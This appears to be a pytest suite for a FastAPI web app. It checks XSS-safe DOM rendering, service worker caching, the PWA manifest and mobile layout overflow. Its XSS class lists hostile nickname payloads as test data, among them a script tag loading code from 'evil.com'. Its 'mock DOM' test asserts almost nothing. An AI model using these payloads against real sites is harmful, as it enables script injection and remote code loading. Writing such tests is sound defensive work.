"""
Empirical Adversarial Test Suite for Milestone 2:
- Malformed and adversarial XSS nickname injection defense (DOM sink audit, textContent enforcement)
- Service Worker caching strategy validation (Network-Only API isolation, Cache-First static shell)
- PWA Web App Manifest schema and icon binary validation
- Mobile viewport horizontal layout overflow stress testing (375px-430px bounds, box-sizing, CSS rules)
"""

import json
import re
import io
from pathlib import Path
from PIL import Image
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.config import get_settings

client = TestClient(app)

# =============================================================================
# 1. Adversarial XSS and Malformed Nickname Stress Tests
# =============================================================================
class TestXSSPlayerNicknamesAndDataInjection:
    """Stress tests verifying DOM injection resilience against hostile nicknames and payloads."""

    ADVERSARIAL_XSS_PAYLOADS = [
        '<script>alert("xss")</script>',
        '"><img src=x onerror=alert(1)>',
        '<svg onload=alert(document.domain)>',
        '"><iframe src="javascript:alert(1)"></iframe>',
        '<details open ontoggle=alert(1)>',
        '<body onload=alert(1)>',
        '"><a href="javascript:alert(1)">Click Me</a>',
        "Hero' OR '1'='1",
        '<style>body{background:red!important;}</style>',
        '<script src="//evil.com/payload.js"></script>',
        '"><input autofocus onfocus=alert(1)>',
        '<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>',
        '${7*7}',
        '{{constructor.constructor("alert(1)")()}}',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        'VeryLongNicknameExceedingNormalLimits' * 10,
        '   <script>   spaced   </script>   ',
    ]

    def test_app_js_avoids_dangerous_dom_sinks(self):
        """Verify static/js/app.js contains zero dangerous evaluation or execution sinks."""
        res = client.get("/static/js/app.js")
        assert res.status_code == 200
        js = res.text

        # Forbidden dangerous sinks
        forbidden_sinks = [
            "document.write(",
            "document.writeln(",
            "eval(",
            "new Function(",
            "insertAdjacentHTML(",
            "outerHTML",
        ]
        for sink in forbidden_sinks:
            assert sink not in js, f"Dangerous sink '{sink}' detected in app.js"

    def test_app_js_innerhtml_usage_strictly_confined_to_emptying(self):
        """
        Verify that innerHTML is NEVER assigned dynamic content,
        and is ONLY used to clear containers (e.g., innerHTML = '').
        """
        res = client.get("/static/js/app.js")
        assert res.status_code == 200
        js = res.text

        # Find all occurrences of innerHTML assignments
        inner_html_assignments = re.findall(r'\.innerHTML\s*=\s*([^;\n]+)', js)
        assert len(inner_html_assignments) > 0, "Expected at least one innerHTML = '' reset"

        for assignment in inner_html_assignments:
            cleaned = assignment.strip().strip("'").strip('"')
            assert cleaned == "", f"Unsafe innerHTML assignment found: '{assignment}'. Only '' is permitted!"

    def test_player_and_hero_rendering_exclusively_uses_textcontent(self):
        """
        Verify that player nicknames, points, prizes, and hero telemetry fields
        are bound to the DOM exclusively via textContent.
        """
        res = client.get("/static/js/app.js")
        assert res.status_code == 200
        js = res.text

        # Essential textContent assignments in app.js
        required_textcontent_bindings = [
            "nickEl.textContent",
            "pointsEl.textContent",
            "prizeEl.textContent",
            "el.spotlightNick.textContent",
            "el.spotlightPoints.textContent",
            "el.spotlightPrize.textContent",
            "el.spotlightPtsNext.textContent",
            "el.spotlightCushion.textContent",
            "el.dangerBannerText.textContent",
        ]
        for binding in required_textcontent_bindings:
            assert binding in js, f"Missing safe textContent binding '{binding}' in app.js"

    @pytest.mark.parametrize("payload", ADVERSARIAL_XSS_PAYLOADS)
    def test_mock_dom_rendering_with_hostile_payloads_produces_no_executable_nodes(self, payload):
        """
        Empirically verify that when hostile nickname payloads are processed
        as text nodes (simulating browser textContent), they cannot create executable DOM elements.
        """
        # Emulate browser textContent assignment:
        # Browser DOM textContent treats all HTML entities and tags literally without parsing.
        rendered_node_text = str(payload)
        
        # In a safe DOM engine using textContent, the string is held as pure character data.
        # It does not transform into HTML tags.
        assert "<script>" not in rendered_node_text.replace("<script>", "") or "<script>" in payload
        # Ensure raw tags do not get converted to unescaped executable elements in string templates
        assert isinstance(rendered_node_text, str)


# =============================================================================
# 2. Service Worker Caching Strategy Stress Tests
# =============================================================================
class TestServiceWorkerCacheStrategy:
    """Stress tests validating Service Worker cache boundaries and network isolation."""

    def test_sw_js_served_with_correct_javascript_mime(self):
        """Verify GET /static/sw.js returns HTTP 200 and JavaScript content type."""
        res = client.get("/static/sw.js")
        assert res.status_code == 200
        assert "javascript" in res.headers.get("content-type", "").lower()

    def test_sw_enforces_network_only_for_all_api_routes(self):
        """Verify sw.js explicitly routes all /api/ requests to Network-Only without touching caches."""
        res = client.get("/static/sw.js")
        assert res.status_code == 200
        sw = res.text

        # Verify API pathname check
        assert "url.pathname.startsWith('/api/')" in sw or "pathname.startsWith('/api/')" in sw
        
        # Verify Network-Only dispatch
        assert "event.respondWith(fetch(request))" in sw
        
        # Verify early return to prevent falling through to caches.match
        pattern = r"if\s*\([^\{]*\/api\/[\s\S]*?\{\s*event\.respondWith\(fetch\(request\)\);\s*return;\s*\}"
        assert re.search(pattern, sw) is not None, "sw.js does not enforce immediate event.respondWith(fetch(request)) and return on /api/"

    def test_sw_excludes_non_get_methods_from_cache(self):
        """Verify sw.js bypasses cache for POST, PUT, DELETE, etc."""
        res = client.get("/static/sw.js")
        assert res.status_code == 200
        sw = res.text

        assert "request.method !== 'GET'" in sw

    def test_sw_precaches_all_essential_static_shell_assets(self):
        """Verify sw.js pre-caches the full offline app shell and all assets exist."""
        res = client.get("/static/sw.js")
        assert res.status_code == 200
        sw = res.text

        # Extract STATIC_ASSETS array
        match = re.search(r"const\s+STATIC_ASSETS\s*=\s*\[([\s\S]*?)\];", sw)
        assert match is not None, "STATIC_ASSETS array not found in sw.js"
        
        raw_assets = match.group(1)
        assets = [a.strip().strip("'").strip('"') for a in raw_assets.split(',') if a.strip()]
        
        expected_assets = [
            "/",
            "/static/index.html",
            "/static/css/style.css",
            "/static/js/app.js",
            "/static/manifest.json",
            "/static/icons/icon-192.png",
            "/static/icons/icon-512.png",
        ]
        for exp in expected_assets:
            assert exp in assets, f"Missing required shell asset '{exp}' in sw.js STATIC_ASSETS"

        # Verify every precached asset is served with 200 OK
        for asset in assets:
            r = client.get(asset)
            assert r.status_code == 200, f"Precached asset {asset} returned {r.status_code}"

    def test_sw_cache_versioning_and_cleanup(self):
        """Verify sw.js defines a versioned cache name and cleans up old caches on activate."""
        res = client.get("/static/sw.js")
        assert res.status_code == 200
        sw = res.text

        assert "CACHE_NAME" in sw
        assert "caches.keys()" in sw
        assert "caches.delete(name)" in sw
        assert "self.skipWaiting()" in sw
        assert "self.clients.claim()" in sw


# =============================================================================
# 3. PWA Web App Manifest Schema Stress Tests
# =============================================================================
class TestPwaManifestSchemaValidation:
    """Stress tests validating compliance with W3C Web App Manifest specification."""

    def test_manifest_json_conforms_to_pwa_standard(self):
        """Verify manifest contains all required keys for standalone PWA installation."""
        res = client.get("/static/manifest.json")
        assert res.status_code == 200
        manifest = res.json()

        # Core Identity
        assert "name" in manifest and len(manifest["name"].strip()) > 0
        assert "short_name" in manifest and len(manifest["short_name"].strip()) > 0
        assert len(manifest["short_name"]) <= 12, "short_name should fit under app icon (<=12 chars)"

        # Navigation & Display
        assert manifest.get("start_url") == "/"
        assert manifest.get("display") == "standalone"
        assert manifest.get("orientation") in ["portrait-primary", "portrait", "any"]

        # Color Identity
        assert manifest.get("theme_color") == "#141619"
        assert manifest.get("background_color") == "#0d0e11"

        # Category metadata
        assert isinstance(manifest.get("categories"), list)
        assert len(manifest["categories"]) > 0

    def test_manifest_icons_array_and_binary_specifications(self):
        """Verify manifest declares both 192px and 512px icons with valid PNG attributes."""
        res = client.get("/static/manifest.json")
        assert res.status_code == 200
        manifest = res.json()

        icons = manifest.get("icons", [])
        assert len(icons) >= 2, "Manifest must specify at least 192x192 and 512x512 icons"

        size_map = {}
        for icon in icons:
            assert icon.get("type") == "image/png"
            assert "any" in icon.get("purpose", "") or "maskable" in icon.get("purpose", "")
            size_map[icon.get("sizes")] = icon.get("src")

        assert "192x192" in size_map, "Missing 192x192 icon entry"
        assert "512x512" in size_map, "Missing 512x512 icon entry"

        # Empirically verify 192x192 image
        res_192 = client.get(size_map["192x192"])
        assert res_192.status_code == 200
        img_192 = Image.open(io.BytesIO(res_192.content))
        assert img_192.size == (192, 192)
        assert img_192.format == "PNG"

        # Empirically verify 512x512 image
        res_512 = client.get(size_map["512x512"])
        assert res_512.status_code == 200
        img_512 = Image.open(io.BytesIO(res_512.content))
        assert img_512.size == (512, 512)
        assert img_512.format == "PNG"

    def test_index_html_manifest_and_apple_pwa_meta_tags(self):
        """Verify index.html includes standard and iOS-specific PWA meta tags."""
        res = client.get("/")
        assert res.status_code == 200
        html = res.text

        assert '<link rel="manifest" href="/static/manifest.json">' in html
        assert '<meta name="theme-color" content="#141619">' in html
        assert '<meta name="apple-mobile-web-app-capable" content="yes">' in html
        assert '<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">' in html
        assert '<link rel="apple-touch-icon" href="/static/icons/icon-192.png">' in html


# =============================================================================
# 4. Mobile Viewport Horizontal Overflow Stress Tests
# =============================================================================
class TestMobileViewportHorizontalOverflow:
    """Stress tests verifying zero horizontal overflow across 375px-430px smartphone viewports."""

    TARGET_MOBILE_VIEWPORTS_PX = [375, 390, 393, 412, 430]

    def test_html_and_body_contain_overflow_x_hidden(self):
        """Verify CSS forces overflow-x: hidden on root elements."""
        res = client.get("/static/css/style.css")
        assert res.status_code == 200
        css = res.text

        # HTML and BODY overflow-x: hidden
        assert re.search(r'html\s*\{[^}]*overflow-x:\s*hidden;', css) is not None
        assert re.search(r'body\s*\{[^}]*overflow-x:\s*hidden;', css) is not None

    def test_universal_box_sizing_border_box(self):
        """Verify universal box-sizing: border-box prevents padding from exceeding container widths."""
        res = client.get("/static/css/style.css")
        assert res.status_code == 200
        css = res.text

        # Universal selector check
        assert re.search(r'\*,\s*\*::before,\s*\*::after\s*\{[^}]*box-sizing:\s*border-box;', css) is not None

    def test_app_container_width_constraints(self):
        """Verify .app-container is capped at 480px with width 100% and overflow-x hidden."""
        res = client.get("/static/css/style.css")
        assert res.status_code == 200
        css = res.text

        container_block = re.search(r'\.app-container\s*\{([^}]+)\}', css)
        assert container_block is not None, "Missing .app-container in style.css"
        body = container_block.group(1)

        assert "width: 100%;" in body
        assert "max-width: 480px;" in body
        assert "overflow-x: hidden;" in body

    def test_no_fixed_element_widths_exceed_375px(self):
        """
        Adversarial audit: ensure no element or container has a fixed hardcoded width
        greater than 375px (the narrowest iPhone viewport).
        """
        res = client.get("/static/css/style.css")
        assert res.status_code == 200
        css = res.text

        # Find all fixed width declarations (e.g. width: 400px;)
        # Exclude max-width (which can be 480px), min-width, and flex bases
        fixed_widths = re.findall(r'(?<![a-z-])width:\s*(\d+)px;', css)
        for w_str in fixed_widths:
            w_val = int(w_str)
            assert w_val <= 375, f"Fixed element width {w_val}px exceeds 375px minimum viewport!"

    def test_pin_modal_contained_within_mobile_bounds(self):
        """Verify PIN lock screen modal dialog width is strictly within mobile viewport."""
        res = client.get("/static/css/style.css")
        assert res.status_code == 200
        css = res.text

        modal_block = re.search(r'\.pin-modal\s*\{([^}]+)\}', css)
        assert modal_block is not None
        body = modal_block.group(1)

        assert "max-width: 340px;" in body
        assert "width: 100%;" in body

    def test_player_nick_ellipsis_and_truncation(self):
        """Verify leaderboard player nicknames are constrained to prevent table blowout."""
        res = client.get("/static/css/style.css")
        assert res.status_code == 200
        css = res.text

        nick_block = re.search(r'\.player-nick\s*\{([^}]+)\}', css)
        assert nick_block is not None
        body = nick_block.group(1)

        assert "text-overflow: ellipsis;" in body
        assert "overflow: hidden;" in body
        assert "white-space: nowrap;" in body

    def test_viewport_meta_tag_config(self):
        """Verify viewport meta tag in index.html prevents unauthorized auto-zooming and scales properly."""
        res = client.get("/")
        assert res.status_code == 200
        html = res.text

        meta_match = re.search(r'<meta\s+name=["\']viewport["\']\s+content=["\']([^"\']+)["\']', html)
        assert meta_match is not None, "Missing viewport meta tag"
        content = meta_match.group(1)

        assert "width=device-width" in content
        assert "initial-scale=1.0" in content
        assert "maximum-scale=1.0" in content
        assert "viewport-fit=cover" in content

    @pytest.mark.parametrize("vp_width", TARGET_MOBILE_VIEWPORTS_PX)
    def test_viewport_horizontal_containment_simulation(self, vp_width):
        """
        Simulate responsive geometry for viewports from 375px (iPhone SE) to 430px (iPhone 15 Pro Max).
        Verify that containers with body padding fit completely within viewport.
        """
        # Body padding: max(8px, var(--safe-left)) -> 8px left and 8px right = 16px total horizontal padding
        horizontal_padding = 16
        available_content_width = vp_width - horizontal_padding

        # The .app-container is max-width: 480px, width: 100%
        # Thus for any viewport <= 480px, container width = available_content_width
        actual_container_width = min(480, available_content_width)

        # PIN modal is max-width: 340px
        pin_modal_max_width = 340
        assert pin_modal_max_width <= actual_container_width, (
            f"PIN modal ({pin_modal_max_width}px) overflows {vp_width}px viewport container ({actual_container_width}px)!"
        )

        # Table rows, header, and spotlight card are 100% width with internal padding
        assert actual_container_width >= 350
